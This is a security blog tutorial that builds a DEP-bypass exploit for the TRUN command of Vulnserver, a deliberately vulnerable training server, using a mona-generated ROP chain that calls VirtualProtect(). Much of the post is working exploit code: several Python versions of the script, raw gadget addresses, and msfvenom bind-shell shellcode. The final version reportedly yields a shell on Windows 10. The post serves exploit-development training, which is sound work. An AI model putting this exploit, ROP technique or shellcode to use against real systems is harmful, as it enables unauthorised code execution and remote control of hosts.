---
slug: vulnserver-trun-rop/
title: 'TRUN: Exploiting with ROP'
date: 2020-08-27
category: attacks
subtitle: Exploiting Vulnserver with ROP
tags: osee, training, exploit, vulnserver
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331216/blog/vulnserver-trun-rop/cover_fyj5gk.webp
alt: Photo by Syed Ali on Unsplash
description: This post will show how to create a complete, functional exploit
  creating a complex shellcode using ROP
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSEE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCE, OSCP, CHFI
about2: '"We don''t need the key, we''ll break in" RATM'
source: https://unsplash.com/photos/74JeU2jfnfk
---

In the last blog posts, we’ve been [dealing with
DEP](../understanding-dep/) (Data Execution Protection) and a way to
[bypass it with ROP](../bypassing-dep/) (Return-Oriented Programming).
If you haven’t read those articles, I strongly recommend it before
diving into this one.

In this article, we will use `ROP` to create a fully working exploit for
the `TRUN` command of [Vulnserver](../tags/vulnserver/) on a DEP-enabled
Windows 10 OS.

## ROP chains

In the [last article](../bypassing-dep/), we used `ROP` to put the value
`0xdeadbeef` on `EAX`. To do that, we used 2 gadgets (sequence of
instructions ending with `RETN`) that performed the needed operations.
What we used is something known as a **ROP chain**, because we chained
together pointers to gadgets on the stack. When one of the gadgets
returns, will give control to the next, until the end of the chain.

`ROP` chains leverage existing instructions on the executable
environment to perform arbitrary actions. In fact, it was demonstrated
that `ROP` is Turing-complete, which means that we can solve any
computational problem using it, which ranges from making `EAX
= 0xdeadbeef` to creating a reverse TCP connection shellcode and beyond.

However, Turing-completeness does not imply code efficiency, and
creating a working shellcode using `ROP` could be a very frustrating and
tedious work.

Fortunately for us, we can reuse our old shellcodes. Yes, I mean it. But
on a DEP-enabled OS, that involves a little of extra effort\!

## Marking shellcode as executable

When you use a CPU with the `NX` (No-execute) bit present, Windows
provide `DEP` as a mean to leverage it. `DEP` is enabled by the OS which
means that it can be disabled too.

That means that we can use `ROP` to disable `DEP` on certain memory
region, place our good old shellcode there and redirect execution to
that memory space.

There are many ways to do that, from creating a new heap into the
process with execution permission to allocating new memory on the
default heap with execution bit enabled or modifying existing memory to
mark it as executable.

The most portable methods are the last two. The first (allocating new
memory) is performed using the `VirtualAllow()` function. The second
uses `VirtualProtect()`.

What you may use depend on several things, mainly the version of Windows
you are attacking. Also, if one of those functions is already loaded on
the executable environment of the vulnerable application, it would be a
good indicator.

Let’s load `vulnserver.exe` on a debugger to see if we can find one of
those functions:

<div class="imgblock">

![VirtualProtect()](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331221/blog/vulnserver-trun-rop/virtualprotect1_enpg6v.gif)

</div>

We were lucky. `VirtualProtect()` was found in the `IAT` (Import Address
Table) of our executable. We will use that method.

## VirtualProtect() signature

According to Microsoft, the `VirtualProtect()` signature is the
following:

``` cpp
BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
```

The parameters are:

1. `lpAddress` is the starting address on where we will store the
    shellcode.

2. `dwSize` is the size of the memory region we’ll mark as executable,
    starting at `lpAddress`.

3. `flNewProtect` is the mask of bits defining the permissions that the
    address region would have (We’ll use this to mark it as executable).

4. `lpflOldProtect` is an address that will receive the current
    permissions of the `lpAddress + dwSize` region.

Using `ROP` we need to put the values of that parameters on the stack.
We also need to setup the stack in a way that we can **return** into the
`VirtualProtect()` call and configure a return address that will be used
as the next `EIP` when `VirtualProtect()` returns. The following diagram
shows the expected stack layout just after executing our first `RETN`:

**Stack layout.**

``` text
Lower addresses
...
.-----------------.
|                 |
`-----------------'
        ESP
.-----------------.
|                 | <- Address to VirtualProtect()
`-----------------'
.-----------------.
|                 | <- Return address for VirtualProtect()
`-----------------'
.-----------------.
|                 | <- lpAddress
`-----------------'
.-----------------.
|                 | <- dwSize
`-----------------'
.-----------------.
|                 | <- flNewProtect
`-----------------'
.-----------------.
|                 | <- lpflOldProtect
`-----------------'
.-----------------.
|                 | <- Start of our shellcode
`-----------------'
...

Higher addresses
```

Let’s see what would be the values to that parameters:

1. Address to `VirtualProtect()`: This can be obtained using the
    debugger. Ideally, we will use later the reference on the `IAT` to
    this function. For now, we found that `VirtualProtect()` is at
    `0x76070420`:

<div class="imgblock">

![VirtualProtect()](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331216/blog/vulnserver-trun-rop/virtualprotect1_pn6rni.webp)

</div>

1. Return address for `VirtualProtect()`: This should be a pointer to a
    `JMP ESP` or `CALL ESP` instruction. This will redirect the
    execution flow to our shellcode when the `ROP` chain finishes,
    enabling the execution flag on the stack. You can obtain multiple
    options for this value using `!mona jmp -n -r esp`. I will pick
    `0x625011AF`

<div class="imgblock">

![Mona
JMP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331213/blog/vulnserver-trun-rop/monajmp1_tmmgoz.webp)

</div>

1. `lpAddress`: This should be the start address on where we expect to
    store our shellcode. In our case, this should be the value of `ESP`
    and the value can only be obtained at runtime. We’ll get to that
    later.

2. `dwSize`: Is the size of the address region that will be marked as
    executable, starting at `lpAddress`. Something like `512` bytes
    (`0x200`) would be enough.

3. `flNewProtect`: Flags to be setup on the memory region. We need to
    mark it as executable, readable and writable
    (`PAGE_EXECUTE_READWRITE`) whose value is `0x40`

4. `lpflOldProtect`: A pointer to a memory region that will receive the
    current permissions of `lpAddress`. That means that this value
    should point to a place where we have write permissions. You can use
    the debugger to find the right place. Ideally this should be an
    address to a module without `ASRL` or `Rebase`. In this case I’ll
    choose the one at `0x62504040`:

<div class="imgblock">

![Writable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331218/blog/vulnserver-trun-rop/writable1_nlr7f6.webp)

</div>

## Verifying execution

Before ROP’ing that values, let’s check if that call works. I will
update the exploit from the [previous article](../bypassing-dep/) with
the call to `VirtualProtect()`. The goal of that exploit was to make
`EAX = 0xdeadbeef`. I will use placeholder values where needed, and
update them at debug time, just to check how `VirtualProtect()` works:

``` python
#!/usr/bin/env python3
"""
Vulnserver TRUN exploit (ROP, DEP bypass).

Vulnerable Software: Vulnserver
Version: 1.00
Exploit Author: Andres Roldan
Tested On: Windows 10 20H2
Writeup: https://fluidattacks.com/blog/vulnserver-trun-rop/
"""

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999


PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    # Pointer to `VirtualProtect()`: 0x6250609C -> 0x76070420
    struct.pack('<L', 0x76070420) +
    # Pointer to JMP ESP
    struct.pack('<L', 0x625011AF) +
    # lpAddress: Dynamic value. Will put a placeholder for now
    struct.pack('<L', 0x41414141) +
    # dwSize: 0x00000200. As we can't inject NULL bytes, we will place
    # 0x11111201 for now
    struct.pack('<L', 0x11111201) +
    # flNewProtect: 0x00000040: As we can't inject NULL bytes, we will place
    # 0x11111140 for now
    struct.pack('<L', 0x11111140) +
    # lpflOldProtect, Pointer to writable address: 0x62504040
    struct.pack('<L', 0x62504040) +
    # Shellcode. Will make EAX = 0xdeadbeef
    b'\x31\xc0' +                   # xor eax,eax
    b'\x05\xee\xbe\xad\xde' +       # add eax,0xdeadbeee
    b'\x40' +                       # inc eax. Now eax=0xdeadbeef
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

I will now run the exploit in stages, to explain every step:

<div class="imgblock">

![Stage
1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331214/blog/vulnserver-trun-rop/run1_rffdx0.gif)

</div>

Here, we can see that we effectively injected the parameters on the
stack and that our first `RETN` gave control to call `VirtualProtect()`.
However, there are some values that need to be changed. Let’s do that:

<div class="imgblock">

![Stage
2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331214/blog/vulnserver-trun-rop/run2_bikqys.gif)

</div>

In this part, I modified the `lpAddress` value with the current value of
`ESP`, then modified `dwSize` making it `0x00000200` or 512 bytes, and
`flNewProtect` was set to `0x40` (`PAGE_EXECUTE_READWRITE`). Now, let
the exploit continues with the modified values:

<div class="imgblock">

![Stage
3](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331216/blog/vulnserver-trun-rop/run3_dy8pb2.gif)

</div>

Wonderful\! The `VirtualProtect()` call effectively marked the region
where our shellcode was placed as executable and we could make `EAX
= 0xdeadbeef`. We bypassed `DEP` again\!

However, that was not a valid execution because we had to use the
debugger to change some values.

## ROP it all

We need to use `ROP` to setup that values. The easiest way is to put the
required values on general purpose registers and then push them to the
stack in the required order. To do that, we can harness the `PUSHAD`
instruction that will save all the general purpose registers on the
stack in the following order:

- `EAX`, `ECX`, `EDX`, `EBX`, `ESP`, `EBP`, `ESI`, `EDI`.

That means that when `PUSHAD` is executed, the stack will have this
content:

**Stack layout.**

``` text
Lower addresses
...
            ESP
    .-----------------.
EDI |                 |
    `-----------------'
    .-----------------.
ESI |                 |
    `-----------------'
    .-----------------.
EBP |                 |
    `-----------------'
    .-----------------.
ESP |                 | <- This is the value of ESP *before* the call to PUSHAD
    `-----------------'
    .-----------------.
EBX |                 |
    `-----------------'
    .-----------------.
EDX |                 |
    `-----------------'
    .-----------------.
ECX |                 |
    `-----------------'
    .-----------------.
EAX |                 |
    `-----------------'
    .-----------------.
    |                 | <- Shellcode
    `-----------------'
...
Higher addresses
```

The most important value for us is the original `ESP` value because that
address is the one that must placed on the `lpAddress` parameter. Using
`lpAddress` as the starting point, we need to place the other parameters
to the adjacent registers, as well as the pointer to `VirtualProtect()`
and the return address:

**Stack layout.**

``` text
Lower addresses
...
            ESP
    .-----------------.
EDI |                 |
    `-----------------'
    .-----------------.
ESI |                 | <- Pointer to VirtualProtect()
    `-----------------'
    .-----------------.
EBP |                 | <- Return address for VirtualProtect()
    `-----------------'
    .-----------------.
ESP |                 | <- lpAddress
    `-----------------'
    .-----------------.
EBX |                 | <- dwSize
    `-----------------'
    .-----------------.
EDX |                 | <- flNewProtect
    `-----------------'
    .-----------------.
ECX |                 | <- lpflOldProtect
    `-----------------'
    .-----------------.
EAX |                 |
    `-----------------'
    .-----------------.
    |                 | <- Shellcode
    `-----------------'
...
Higher addresses
```

Great, all the parameters for `VirtualProtect()` fit on those registers.

But something happens here. You may notice that the `EDI` register is
not used, but when our first `RETN` is executed, it will land there. In
that case, we need to store on `EDI` a pointer to a `RETN` instruction
again. This will make the execution return to where `ESI` address is
pointing, which is the call to `VirtualProtect()`:

**Stack layout.**

``` text
Lower addresses
...
            ESP
    .-----------------.
EDI |                 | <- Pointer to RETN instruction
    `-----------------'
    .-----------------.
ESI |                 | <- Pointer to VirtualProtect()
    `-----------------'
    .-----------------.
EBP |                 | <- Return address for VirtualProtect()
    `-----------------'
    .-----------------.
ESP |                 | <- lpAddress
    `-----------------'
    .-----------------.
EBX |                 | <- dwSize
    `-----------------'
    .-----------------.
EDX |                 | <- flNewProtect
    `-----------------'
    .-----------------.
ECX |                 | <- lpflOldProtect
    `-----------------'
    .-----------------.
EAX |                 |
    `-----------------'
    .-----------------.
    |                 | <- Shellcode
    `-----------------'
...
Higher addresses
```

You will also note that `EAX` is also not set and this is the place
where the shellcode is supposed to start. To overcome that, we can fill
`EAX` with `NOP` instructions that will slide the execution to the
shellcode:

**Stack layout.**

``` text
Lower addresses
...
            ESP
    .-----------------.
EDI |                 | <- Pointer to RETN instruction
    `-----------------'
    .-----------------.
ESI |                 | <- Pointer to VirtualProtect()
    `-----------------'
    .-----------------.
EBP |                 | <- Return address for VirtualProtect()
    `-----------------'
    .-----------------.
ESP |                 | <- lpAddress
    `-----------------'
    .-----------------.
EBX |                 | <- dwSize
    `-----------------'
    .-----------------.
EDX |                 | <- flNewProtect
    `-----------------'
    .-----------------.
ECX |                 | <- lpflOldProtect
    `-----------------'
    .-----------------.
EAX |                 | <- \x90\x90\x90\x90
    `-----------------'
    .-----------------.
    |                 | <- Shellcode
    `-----------------'
...
Higher addresses
```

Perfect. We need to use `ROP` gadgets to setup those registers first and
then add a pointer to a `PUSHAD # RETN` gadget at the end of the chain.
Fortunately for us, `mona` will do the hard work, by issuing the
following command:

``` bash
!mona rop -m *.dll -n
```

This will go through all executable modules finding `ROP` gadgets that
can be useful. At the end, `mona` will generate several files with the
result. The most important one in this stage is `rop_chains.txt` file
that contains the chain of gadgets needed to setup the registers with
the values in the required order.

This is the resulting ROP gadget chain in my system:

``` python
  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c5b862,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x7714ae82,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR
      0x7712c3c6,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebp:---]
      0x7554bdee,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
      0x625011af,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x625011b4,  # POP EAX # RETN [essfunc.dll]
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x760987da,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
      0x771cf5b9,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edx:---]
      0x7714ebc3,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76099c08,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
      0x759cc549,  # XCHG EAX,EDX # RETN [WS2_32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ecx:---]
      0x75567ffd,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
      0x75a08cf7,  # &Writable location [WS2_32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x75cf4a3b,  # POP EDI # RETN [KERNELBASE.dll] ** REBASED ** ASLR
      0x76099c0a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x755617cc,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x770f9589,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()
```

You can see that the registers are arranged exactly as we wanted.

We can incorporate that function in our exploit:

``` python
#!/usr/bin/env python3
"""
Vulnserver TRUN exploit (ROP, DEP bypass).

Vulnerable Software: Vulnserver
Version: 1.00
Exploit Author: Andres Roldan
Tested On: Windows 10 20H2
Writeup: https://fluidattacks.com/blog/vulnserver-trun-rop/
"""

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x75c5b862,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x7714ae82,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR
        0x7712c3c6,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebp:---]
        0x7554bdee,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x625011af,  # & jmp esp [essfunc.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x625011b4,  # POP EAX # RETN [essfunc.dll]
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x760987da,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
        0x771cf5b9,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edx:---]
        0x7714ebc3,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76099c08,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
        0x759cc549,  # XCHG EAX,EDX # RETN [WS2_32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ecx:---]
        0x75567ffd,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x75a08cf7,  # &Writable location [WS2_32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x75cf4a3b,  # POP EDI # RETN [KERNELBASE.dll] ** REBASED ** ASLR
        0x76099c0a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x755617cc,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x770f9589,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    create_rop_chain() +
    # Shellcode. Will make EAX = 0xdeadbeef
    b'\x31\xc0' +                   # xor eax,eax
    b'\x05\xee\xbe\xad\xde' +       # add eax,0xdeadbeee
    b'\x40' +                       # inc eax. Now eax=0xdeadbeef
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it:

<div class="imgblock">

![ROP
Chain](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331217/blog/vulnserver-trun-rop/run4_ayeb4j.gif)

</div>

Isn’t it wonderful? We were able to setup the call to `VirtualProtect()`
with the required parameters using `ROP`.

Let’s resume the execution to check if that worked:

<div class="imgblock">

![ROP
Chain](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331216/blog/vulnserver-trun-rop/run5_mxyouz.gif)

</div>

Indeed\! Again, we were able to make `EAX = 0xdeadbeef` using a
traditional shellcode. We can now replace that mock shellcode with one
of our good ol' ones from `msfvenom`:

``` console
$ msfvenom -p windows/shell_bind_tcp -f python -v SHELL -b '\x00'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 355 (iteration=0)
x86/shikata_ga_nai chosen with final size 355
Payload size: 355 bytes
Final size of python file: 1823 bytes
SHELL =  b""
SHELL += b"\xda\xd3\xbe\xaa\x69\x45\x3a\xd9\x74\x24\xf4\x5a"
SHELL += b"\x2b\xc9\xb1\x53\x31\x72\x17\x03\x72\x17\x83\x68"
SHELL += b"\x6d\xa7\xcf\x90\x86\xa5\x30\x68\x57\xca\xb9\x8d"
SHELL += b"\x66\xca\xde\xc6\xd9\xfa\x95\x8a\xd5\x71\xfb\x3e"
SHELL += b"\x6d\xf7\xd4\x31\xc6\xb2\x02\x7c\xd7\xef\x77\x1f"
SHELL += b"\x5b\xf2\xab\xff\x62\x3d\xbe\xfe\xa3\x20\x33\x52"
SHELL += b"\x7b\x2e\xe6\x42\x08\x7a\x3b\xe9\x42\x6a\x3b\x0e"
SHELL += b"\x12\x8d\x6a\x81\x28\xd4\xac\x20\xfc\x6c\xe5\x3a"
SHELL += b"\xe1\x49\xbf\xb1\xd1\x26\x3e\x13\x28\xc6\xed\x5a"
SHELL += b"\x84\x35\xef\x9b\x23\xa6\x9a\xd5\x57\x5b\x9d\x22"
SHELL += b"\x25\x87\x28\xb0\x8d\x4c\x8a\x1c\x2f\x80\x4d\xd7"
SHELL += b"\x23\x6d\x19\xbf\x27\x70\xce\xb4\x5c\xf9\xf1\x1a"
SHELL += b"\xd5\xb9\xd5\xbe\xbd\x1a\x77\xe7\x1b\xcc\x88\xf7"
SHELL += b"\xc3\xb1\x2c\x7c\xe9\xa6\x5c\xdf\x66\x0a\x6d\xdf"
SHELL += b"\x76\x04\xe6\xac\x44\x8b\x5c\x3a\xe5\x44\x7b\xbd"
SHELL += b"\x0a\x7f\x3b\x51\xf5\x80\x3c\x78\x32\xd4\x6c\x12"
SHELL += b"\x93\x55\xe7\xe2\x1c\x80\x92\xea\xbb\x7b\x81\x17"
SHELL += b"\x7b\x2c\x05\xb7\x14\x26\x8a\xe8\x05\x49\x40\x81"
SHELL += b"\xae\xb4\x6b\xbc\x72\x30\x8d\xd4\x9a\x14\x05\x40"
SHELL += b"\x59\x43\x9e\xf7\xa2\xa1\xb6\x9f\xeb\xa3\x01\xa0"
SHELL += b"\xeb\xe1\x25\x36\x60\xe6\xf1\x27\x77\x23\x52\x30"
SHELL += b"\xe0\xb9\x33\x73\x90\xbe\x19\xe3\x31\x2c\xc6\xf3"
SHELL += b"\x3c\x4d\x51\xa4\x69\xa3\xa8\x20\x84\x9a\x02\x56"
SHELL += b"\x55\x7a\x6c\xd2\x82\xbf\x73\xdb\x47\xfb\x57\xcb"
SHELL += b"\x91\x04\xdc\xbf\x4d\x53\x8a\x69\x28\x0d\x7c\xc3"
SHELL += b"\xe2\xe2\xd6\x83\x73\xc9\xe8\xd5\x7b\x04\x9f\x39"
SHELL += b"\xcd\xf1\xe6\x46\xe2\x95\xee\x3f\x1e\x06\x10\xea"
SHELL += b"\x9a\x36\x5b\xb6\x8b\xde\x02\x23\x8e\x82\xb4\x9e"
SHELL += b"\xcd\xba\x36\x2a\xae\x38\x26\x5f\xab\x05\xe0\x8c"
SHELL += b"\xc1\x16\x85\xb2\x76\x16\x8c"
```

And update our exploit:

``` python
#!/usr/bin/env python3
"""
Vulnserver TRUN exploit (ROP, DEP bypass).

Vulnerable Software: Vulnserver
Version: 1.00
Exploit Author: Andres Roldan
Tested On: Windows 10 20H2
Writeup: https://fluidattacks.com/blog/vulnserver-trun-rop/
"""

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999


def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x75c5b862,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x7714ae82,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR
        0x7712c3c6,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebp:---]
        0x7554bdee,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x625011af,  # & jmp esp [essfunc.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x625011b4,  # POP EAX # RETN [essfunc.dll]
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x760987da,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
        0x771cf5b9,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edx:---]
        0x7714ebc3,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76099c08,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
        0x759cc549,  # XCHG EAX,EDX # RETN [WS2_32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ecx:---]
        0x75567ffd,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x75a08cf7,  # &Writable location [WS2_32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x75cf4a3b,  # POP EDI # RETN [KERNELBASE.dll] ** REBASED ** ASLR
        0x76099c0a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x755617cc,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x770f9589,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


# msfvenom -p windows/shell_bind_tcp -f python -v SHELL -b '\x00'
SHELL =  b""
SHELL += b"\xbe\x9a\xd8\xa3\xeb\xd9\xc6\xd9\x74\x24\xf4\x5d"
SHELL += b"\x2b\xc9\xb1\x53\x31\x75\x12\x83\xc5\x04\x03\xef"
SHELL += b"\xd6\x41\x1e\xf3\x0f\x07\xe1\x0b\xd0\x68\x6b\xee"
SHELL += b"\xe1\xa8\x0f\x7b\x51\x19\x5b\x29\x5e\xd2\x09\xd9"
SHELL += b"\xd5\x96\x85\xee\x5e\x1c\xf0\xc1\x5f\x0d\xc0\x40"
SHELL += b"\xdc\x4c\x15\xa2\xdd\x9e\x68\xa3\x1a\xc2\x81\xf1"
SHELL += b"\xf3\x88\x34\xe5\x70\xc4\x84\x8e\xcb\xc8\x8c\x73"
SHELL += b"\x9b\xeb\xbd\x22\x97\xb5\x1d\xc5\x74\xce\x17\xdd"
SHELL += b"\x99\xeb\xee\x56\x69\x87\xf0\xbe\xa3\x68\x5e\xff"
SHELL += b"\x0b\x9b\x9e\x38\xab\x44\xd5\x30\xcf\xf9\xee\x87"
SHELL += b"\xad\x25\x7a\x13\x15\xad\xdc\xff\xa7\x62\xba\x74"
SHELL += b"\xab\xcf\xc8\xd2\xa8\xce\x1d\x69\xd4\x5b\xa0\xbd"
SHELL += b"\x5c\x1f\x87\x19\x04\xfb\xa6\x38\xe0\xaa\xd7\x5a"
SHELL += b"\x4b\x12\x72\x11\x66\x47\x0f\x78\xef\xa4\x22\x82"
SHELL += b"\xef\xa2\x35\xf1\xdd\x6d\xee\x9d\x6d\xe5\x28\x5a"
SHELL += b"\x91\xdc\x8d\xf4\x6c\xdf\xed\xdd\xaa\x8b\xbd\x75"
SHELL += b"\x1a\xb4\x55\x85\xa3\x61\xc3\x8d\x02\xda\xf6\x70"
SHELL += b"\xf4\x8a\xb6\xda\x9d\xc0\x38\x05\xbd\xea\x92\x2e"
SHELL += b"\x56\x17\x1d\x41\xfb\x9e\xfb\x0b\x13\xf7\x54\xa3"
SHELL += b"\xd1\x2c\x6d\x54\x29\x07\xc5\xf2\x62\x41\xd2\xfd"
SHELL += b"\x72\x47\x74\x69\xf9\x84\x40\x88\xfe\x80\xe0\xdd"
SHELL += b"\x69\x5e\x61\xac\x08\x5f\xa8\x46\xa8\xf2\x37\x96"
SHELL += b"\xa7\xee\xef\xc1\xe0\xc1\xf9\x87\x1c\x7b\x50\xb5"
SHELL += b"\xdc\x1d\x9b\x7d\x3b\xde\x22\x7c\xce\x5a\x01\x6e"
SHELL += b"\x16\x62\x0d\xda\xc6\x35\xdb\xb4\xa0\xef\xad\x6e"
SHELL += b"\x7b\x43\x64\xe6\xfa\xaf\xb7\x70\x03\xfa\x41\x9c"
SHELL += b"\xb2\x53\x14\xa3\x7b\x34\x90\xdc\x61\xa4\x5f\x37"
SHELL += b"\x22\xd4\x15\x15\x03\x7d\xf0\xcc\x11\xe0\x03\x3b"
SHELL += b"\x55\x1d\x80\xc9\x26\xda\x98\xb8\x23\xa6\x1e\x51"
SHELL += b"\x5e\xb7\xca\x55\xcd\xb8\xde"

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    create_rop_chain() +
    # Align stack
    b'\x83\xE4\xF0' +   # and esp, 0xfffffff0
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Note that I added the `and esp, 0xfffffff0` instruction before the
shellcode to align the stack. This is commonly needed when you mess
around with the stack.

Let’s check it now:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331215/blog/vulnserver-trun-rop/success_y8d4wg.gif)

</div>

Great\! We successfuly disabled `DEP` for our process and got a shell\!

You can download the final exploit [here](exploit.py).

## Conclusions

In this article, we used the power of Return-Oriented Programming to
complete a working exploit with a binded `TCP` shell on a DEP-enabled
OS. As each application is different, using `ROP` gadgets to perform
complex operations is an art, because there is not a generic way to do
it.
